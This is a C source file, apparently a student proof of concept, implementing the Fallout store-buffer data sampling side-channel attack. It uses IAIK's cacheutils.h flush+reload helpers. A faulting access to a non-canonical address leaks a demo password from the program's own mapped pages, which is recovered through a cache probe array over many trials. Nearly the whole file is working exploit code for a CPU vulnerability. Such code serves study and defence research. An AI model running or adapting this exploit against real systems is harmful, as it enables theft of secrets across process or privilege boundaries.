#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <memory.h>
#include <sys/mman.h>

#include "cacheutils.h"

/*Submitter: Hanna Hayik*/

/*Acknowledgment: We would like to thank IAIK (Information Processing & Data Institue) in Graz, Austria
Because we used their cache utilties file (cacheutils.h) that allowed us to better Understand, Explain and Perform this attack
you can find the original files from their Public Github page: https://github.com/IAIK/ZombieLoad */

//probe array
char __attribute__((aligned(4096))) mem[256 * 4096];
int hist[256];

void recover(int[], int);

void fallout(int str_len, char* str, int toReturn[]){
  // Initialize and flush LUT
  memset(mem, 0, sizeof(mem));
  
  //set segementation fault handler to try/catch 
  signal(SIGSEGV, trycatch_segfault_handler);
  char* attacker_address =(char*) 0x9876543214321000ull;
  
  //flush probe array from cache
  for (size_t i = 0; i < 256; i++) {
    flush(mem + i * 4096);
  }
  
  //map str_len pages to write to
  char* victim_pages[str_len];
  for(int i=0; i<str_len; i++)
    victim_pages[i]=(char*)mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
  
  for(int i=0; i<str_len; i++){
    flush(victim_pages[i]);
    toReturn[i]=-1;
  }
  mfence();
  int i=0;
  while(i<str_len){
    //Fallout happens here
    (victim_pages[i])[i*10]=str[i];
    if (!setjmp(trycatch_buf)) {
  	  maccess(mem + 4096 * attacker_address[i*10]);
    }
    recover(toReturn, i);
    i++;
  }
  
  //free the mapped pages
  for(int i=0; i<str_len; i++)
    munmap(victim_pages[i], 4096);
}

int main(int argc, char *argv[]) {
  	// Calculate Flush+Reload threshold
  fprintf(stderr, "Calculating CACHE_MISS Cycles....\n");
  CACHE_MISS = detect_flush_reload_threshold();
  fprintf(stderr, "[+] Flush+Reload Cache Miss Cycles: %zu\n\n", CACHE_MISS);
  
  //change originalPass if you want to try another password 
  char *originalPass = "MicroArchitecturalStoreBufferDataSampling";
  char str[1024];
  for(int i=0; i<strlen(originalPass); i++)
    str[i]=originalPass[i];
  int str_len = strlen(originalPass);
  
    //array for final combining
  int password[str_len];
  for(int i=0; i<str_len; i++){
    password[i]=-1;
  }
  
  //probes is the number of times the sampling is repeated
  int probes = 1000;
  //big array to perform analysis
  int Kresults[probes][str_len];
  //init all cells to -1
  for(int i=0; i<probes; i++){
    for(int j=0; j<str_len; j++){
      Kresults[i][j]=-1;
    }
  }
  
  //perform fallout PROBES times
  for(int i=0; i<probes; i++)
    fallout(str_len, str, Kresults[i]);
  
  //collect the results from all arrays used in the attacks
  for(int i=0; i<probes; i++){
    for(int j=0; j<str_len; j++){
      if(Kresults[i][j]!=-1){
        password[j]=Kresults[i][j];
      }
    }
  }
  
  //print original and leaked password 
  int total=0;
  printf("leaked password:    ");
    for(int i=0; i<str_len; i++){
    if(password[i]!=-1){
      printf("%c", (char)password[i]);
      total++;
    }
    else
      printf("_");
    }
  printf("\noriginal password:  ");
    for(int i=0; i<str_len; i++)
      printf("%c", str[i]);
  printf("\n");
  printf("LEAKED PASSWORD BYTES IN TOTAL: %d\n\n", total);
  return 0;
}

void recover(int results[], int index) {
  // Recover value from cache and update histogram
  int update = 0;
  for (size_t i = 1; i <= 255; i++) {
    if (flush_reload((char *)mem + 4096 * i)) {
      hist[i]++;
      update = 1;
    }
  }

  // If new hit, display histogram
  if(update){
  	for (size_t i =0; i<256; i++)
  		if(hist[i]){ 
        hist[i]=0;
  			results[index]=i;
      }
  }
}
